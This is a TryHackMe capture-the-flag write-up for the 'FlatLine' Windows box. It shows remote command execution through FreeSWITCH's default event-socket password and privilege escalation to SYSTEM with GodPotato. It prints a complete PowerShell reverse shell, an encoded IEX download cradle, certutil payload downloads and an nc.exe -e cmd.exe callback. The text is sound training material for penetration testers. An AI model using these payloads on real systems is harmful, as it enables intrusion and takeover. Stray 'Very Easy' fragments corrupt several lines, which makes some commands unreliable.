# FlatLine TryHackMe Writeup

---

## Machine Information

| Field | Details |
|---|---|
| **Name** | FlatLine |
| **Platform** | TryHackMe |
| **OS** | Windows |
| **Difficulty** | Very Easy |

---

## Enumeration

### Nmap

```bash
nmap -Pn $target -sV -v -n -p- --min-rate 10000
```

```
PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket

Service Info: OS: Windows
```

Only two ports open on the entire machine. Port 3389 is RDP standard Windows remote desktop, not much to do there without credentials. Port 8021 is the interesting one: **FreeSWITCH mod_event_socket**.

FreeSWITCH is an open-source telephony platform (VoIP, call routing, etc.). The `mod_event_socket` module is a management interface that lets administrators send commands to the FreeSWITCH process over TCP. By default it listens on port 8021, and by default it uses a well-known password. [FreeSwitch](https://x7331.gitbook.io/boxes/services/tcp/freeswitch-8021)

### FreeSWITCH Manual Exploration

Before reaching for any tools, let's just connect manually and see what we're working with:

```
nc $target 8021
```

```
Content-Type: auth/request

auth ClueCon

Content-Type: command/reply
Reply-Text: +OK accepted
```

`ClueCon` is the default password for FreeSWITCH's event socket and it worked. We're authenticated. Trying to run `whoami` directly though:

```
whoami

Content-Type: command/reply
Reply-Text: -ERR command not found
```

FreeSWITCH has its own command protocol it's not a shell. Commands need to be sent in the right format (`api system <cmd>` to run OS commands). That's where the exploit comes inVery Easy

## Initial Foothold

### FreeSWITCH Command Execution (EDB-47799)

A quick searchsploit lookup:

```bash
searchsploit freeswitch
``Very Easy
FreeSWITCH - Event Socket Command Execution (Metasploit)  | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                     | windows/remote/47799.txt
```

i grabbed the Python exploit:

```bash
searchsploit -m 47799.txt
mv 47799.txt exploit.py
```

The exploit is straightforward it connects to port 8021, authenticates with the default password `ClueCon`, then uses the `api system` command to run arbitrary OS commands as the FreeSWITCH process. The key insight from the exploit's comment:

> FreeSWITCH listens on port 8021 by default and will accept and run commands sent to it after authenticating. By default commands are not accepted from remote hosts.

This last line is important the fact that this machine *does* accept remote connections on 8021 is the misconfiguration being exploited.

Quick test:

```
python3 exploit.py $target whoami
```

```
Authenticated
Content-Type: api/response
ContentVery Easyh: 25

win-eom4pk0578n\nekrotic
```

We have RCE as user `nekrotic`. Now we need to turn this into an interactive shell.

### Getting a Reverse Shell

This took a few tries due to some encoding quirks. Here's the full journey:

#### Attempt 1: UTF-8 Base64 (Failed)

My first instinct was to base64-encode a PowerShell reverse shell and pass it via `-EncodedCommand`:

```bash
echo '<powershell reverse shell>' > rshell.txt
base64 -w 0 rshell.txt
python3 exploit.py $target 'powershell -e <base64>'
```

```
Authenticated
Content-Type: api/response

Cannot process the command because the value specified with -EncodedCommand
is not properly encoded. The value must be Base64 encoded.
```

The error makes the problem clear: PowerShell's `-EncodedCommand` flag doesn't just want any base64 it specifically wants the command encoded as **UTF-16LE**, not UTF-8. Linux `base64` uses UTF-8 by default, so the encoding was technically valid base64 but the wrong character set for PowerShell.

#### Attempt 2: UTF-16LE Encoded Full Payload (Failed Truncated)

Switched to the correct encoding pipeline and a cleaner payload. The `shell.ps1` used:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.159.225',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'Very Easy (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Encoded properly this time:

```
cat shell.ps1 | iconv -t UTF-16LE | base64 -w 0
```

```
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...
```

Sent it:

```bash
python3 exploit.py $target 'powershell -nop -c JABjAGwAaQBlAG4AdAAgAD0A...'
```

```
Authenticated
Content-Type: api/response
Content-Length: 2264

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...
```

The response just echoed the base64 string back nothing happened. The issue here is that the full payload was too long. FreeSWITCH's `recv` buffer only reads up to 8096 bytes, and our encoded payload exceeded that limit. It got truncated mid-string, which meant PowerShell received an incomplete (and therefore unexecutable) command.

#### Attempt 3: IEX Download Cradle (Success)

The fix: instead of embedding the full payload in the command, use a short one-liner that tells PowerShell to download and execute `shell.ps1` from our HTTP server. The command itself is tiny only the URL needs to be encoded:

```bash
echo -n 'iex ((New-Object System.Net.WebClient).DownloadString("http://192.168.159.225:8000/shell.ps1"))' | iconv -t UTF-16LE | base64 -w 0

aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxADUAOQAuADIAMgA1ADoAOAAwADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACIAKQApAA==
```

and set python HTTP server to serve `shell.ps1

```bash
python3 -m http.server
```

Set up the listener:

```bash
nc -lvnp 4444
```

Fired the exploit:

```bash
python3 exploit.py $target 'powershell -e aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxADUAOQAuADIAMgA1ADoAOAAwADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACIAKQApAA=='
```

```
Authenticated

# HTTP server log:
10.49.161.253 - - [23/Sep/2026 09:03:22] "GET /shell.ps1 HTTP/1.1" 200 -
```

And on the listener:

```
connect to [192.168.159.225] from (UNKNOWN) [10.49.161.253] 49897
PS C:\Program Files\FreeSWITCH>
```

Shell as `nekrotic`. Let's grab the user flag:

```
PS C:\Users\nekrotic\Desktop> type user.txt
THM{64bca0843d535fa73eREDACTED7cbe26}
```

---

## Privilege Escalation

### SeImpersonatePrivilege → GodPotato

First thing to check after getting a shell what privileges does this account have?

```
PS C:\Users\nekrotic\Desktop> whoami /priv | findstr Enabled
SeDebugPrivilege         Debug programs                    Enabled
SeChangeNotifyPrivilege  Bypass traverse checking          Enabled
SeImpersonatePrivilege   Impersonate a client after auth   Enabled
SeCreateGlobalPrivilege  Create global objects             Enabled
```

`SeImpersonatePrivilege` is enabled. This is a classic service account privilege that's commonly abused via "Potato" attacks. The idea: service accounts with `SeImpersonatePrivilege` can impersonate any user that connects to a named pipe thVery Easyate. By tricking `NT AUTHORITY\SYSTEM` into connecting to our pipe (via COM/DCOM coercion), we can steal its token and run commands as SYSTEM.

**GodPotato** is a modern implementation of this technique that works across Windows Server 2012–2022 using a DCOM object coercion approach.

Fetch GodPotato and netcat to the target via certutil (which can download files from URLs):

```powershell
# Transfer GodPotato
certutil.exe -urlcache -f "http://192.168.159.225:8000/GodPotato-NET4.exe" potato.exe

# Transfer nc.exe
certutil.exe -urlcache -f "http://192.168.159.225:8000/nc.exe" nc.exe
```

Set up a second listener:

```bash
nc -lvnp 5555
```

Run GodPotato with a reverse shell command:

```powershell
PS C:\Windows\Temp> ./potato.exe -cmd "nc.exe 192.168.159.225 5555 -e cmd.exe"
```

```
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\6cc9a805-b685-4fb3-a999-117ecb74e436\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] PID : 536 Token:0x612  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 4216
```

On our second listener:

```
connect to [192.168.159.225] from (UNKNOWN) [10.49.161.253]
Microsoft Windows [Version 10.0.17763.2928]

C:\Windows\system32> type C:\Users\nekrotic\Desktop\root.txt
THM{8c8bc5558f0f3f8060REDACTEDa9fb5e}
```

SYSTEM shell and root flag captured.

---

## Lessons Learned

**Default credentials on management interfaces are a real threat.** FreeSWITCH ships with `ClueCon` as the default event socket password. The service also allows remote connections by default in some configurations. This is a textbook case of "deploy and forget" the service was set up but never hardened. Any management interface with a default password that's exposed to the network is a direct foothold.

**PowerShell `-EncodedCommand` needs UTF-16LE, not UTF-8.** This is a common gotcha when building payloads on Linux for Windows targets. The correct encoding pipeline is `echo -n 'command' | iconv -t UTF-16LE | base64 -w 0`. Forgetting the `iconv` step produces valid base64, but PowerShell rejects it with a confusing "not properly encoded" error.

**Buffer size matters for piped command injection.** When your payload is too long for the receiving buffer (8096 bytes in FreeSWITCH's case), the command gets truncated silently. The solution is to keep the injected command minimal and use it to pull the real payload from a hosted file (IEX download cradle). This also helps bypass some command-length restrictions in other contextVery Easy`SeImpersonatePrivilege` is nearly always exploitable.** If a service account has this privilege enabled, Potato attacks (GodPotato, PrintSpoofer, etc.) are almost guaranteed to work on unpatched Windows systems. When you see this privilege on a foothold, escalation is typically a few commands away.

---

## Tools & References

| Tool | Purpose |
|---|---|
| **nmap** | Port scanning & service version detection |
| **netcat (nc)** | Manual port exploration & reverse shell listener |
| **searchsploit** | Finding public exploits for FreeSWITCH |
| **exploit.py** (EDB-47799) | FreeSWITCH event socket command execution |
| **Python HTTP server** | Hosting payload files for download |
| **GodPotato-NET4.exe** | SeImpersonatePrivilege → SYSTEM via DCOM coercion |
| **certutil.exe** | File transfer via URL (built-in Windows) |
| **nc.exe** | Windows netcat for the SYSTEM reverse shell |

**References:**
- [EDB-47799 FreeSWITCH 1.10.1 Command Execution](https://www.exploit-db.com/exploits/47799)
- [PoC](https://x7331.gitbook.io/boxes/services/tcp/freeswitch-8021)
- [GodPotato](https://github.com/BeichenDream/GodPotato)